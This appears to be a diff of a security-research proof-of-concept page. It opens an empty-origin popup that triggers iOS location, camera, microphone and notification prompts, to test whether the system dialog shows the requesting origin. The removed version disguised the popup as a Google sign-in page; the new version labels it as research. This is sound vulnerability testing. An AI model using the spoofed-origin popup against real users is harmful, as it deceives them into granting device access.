@@ -15,13 +15,13 @@ button:active{opacity:.7}
 </head>
 <body>
 <h2>Permission Prompt Origin</h2>
-<p>Opens the empty-origin popup, then triggers permission prompts from inside it. Check what origin the iOS system dialog shows.</p>
+<p>Opens the no-origin popup, then triggers permission prompts from inside it. Check what origin the iOS system dialog shows.</p>
 <div class="warn">If the permission dialog shows NO origin or a wrong origin, that's a security bug (user can't make informed consent).</div>
 
-<button onclick="run('geo')">Click me — Location prompt</button>
-<button onclick="run('cam')" style="background:#34c759">Click me — Camera prompt</button>
-<button onclick="run('mic')" style="background:#ff9500">Click me — Microphone prompt</button>
-<button onclick="run('notif')" style="background:#af52de">Click me — Notification prompt</button>
+<button onclick="run('geo')">Click me &mdash; Location prompt</button>
+<button onclick="run('cam')" style="background:#34c759">Click me &mdash; Camera prompt</button>
+<button onclick="run('mic')" style="background:#ff9500">Click me &mdash; Microphone prompt</button>
+<button onclick="run('notif')" style="background:#af52de">Click me &mdash; Notification prompt</button>
 
 <script>
 function run(type){
@@ -41,7 +41,7 @@ function run(type){
     if(type==='mic') js='navigator.mediaDevices.getUserMedia({audio:true}).then(function(s){document.title="Got mic";s.getTracks().forEach(function(t){t.stop()})}).catch(function(e){document.title="Denied: "+e.message})';
     if(type==='notif') js='Notification.requestPermission().then(function(r){document.title="Notif: "+r})';
     w.document.open();
-    w.document.write('<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in - Google Accounts</title></head><body style="font-family:-apple-system,sans-serif;background:#fff;text-align:center;padding:40px 24px"><div style="font-size:24px;margin-bottom:8px"><span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span></div><p style="color:#5f6368;font-size:14px">Requesting permission...</p><scr'+'ipt>'+js+'<\/scr'+'ipt></body></html>');
+    w.document.write('<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Permission test (research)</title></head><body style="font-family:-apple-system,sans-serif;background:#fff;text-align:center;padding:40px 24px"><div style="display:inline-block;background:#fff3cd;border:1px solid #ffe08a;border-radius:6px;padding:6px 10px;font-size:12px;color:#7a5c00;margin-bottom:16px">Security research PoC</div><h1 style="font-size:18px;font-weight:600;color:#1d1d1f;margin:8px 0">Requesting permission&hellip;</h1><p style="color:#5f6368;font-size:13px;line-height:1.5">Look at the origin shown in the iOS system permission dialog. The address bar above should be empty.</p><scr'+'ipt>'+js+'<\/scr'+'ipt></body></html>');
     w.document.close();
     w.stop();
   },50);
